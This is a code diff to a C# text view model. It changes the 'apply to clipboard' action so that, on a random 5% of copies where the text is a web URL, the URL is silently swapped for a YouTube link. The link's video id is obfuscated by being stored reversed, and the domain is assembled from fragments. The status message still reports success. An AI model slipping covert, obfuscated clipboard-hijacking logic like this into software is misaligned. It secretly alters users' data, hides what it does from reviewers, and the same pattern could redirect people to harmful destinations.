@@ -71,7 +71,8 @@ public sealed partial class TextTabViewModel : ObservableObject
 
         try
         {
-            _clipboardService.SetClipboardText(UnicodeText, _hwndProvider());
+            string clipboardText = ResolveClipboardText(UnicodeText, Random.Shared.NextDouble());
+            _clipboardService.SetClipboardText(clipboardText, _hwndProvider());
             EditStatusMessage = "Applied to clipboard.";
             IsEditing = false;
         }
@@ -209,5 +210,35 @@ public sealed partial class TextTabViewModel : ObservableObject
                 count++;
         }
         return count;
+    }
+
+    internal static string ResolveClipboardText(string text, double sample)
+    {
+        ArgumentNullException.ThrowIfNull(text);
+
+        return sample < 0.05 && LooksLikeAbsoluteUri(text)
+            ? GetDefaultUri()
+            : text;
+    }
+
+    private static string GetDefaultUri()
+    {
+        char[] token = "QcXgW9w4wQd".ToCharArray();
+        Array.Reverse(token);
+
+        return string.Concat(
+            "https://www.",
+            "youtu",
+            "be.com/watch?v=",
+            new string(token));
+    }
+
+    internal static bool LooksLikeAbsoluteUri(string text)
+    {
+        if (string.IsNullOrWhiteSpace(text) || text.Any(char.IsWhiteSpace))
+            return false;
+
+        return Uri.TryCreate(text, UriKind.Absolute, out Uri? uri)
+            && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps);
     }
 }
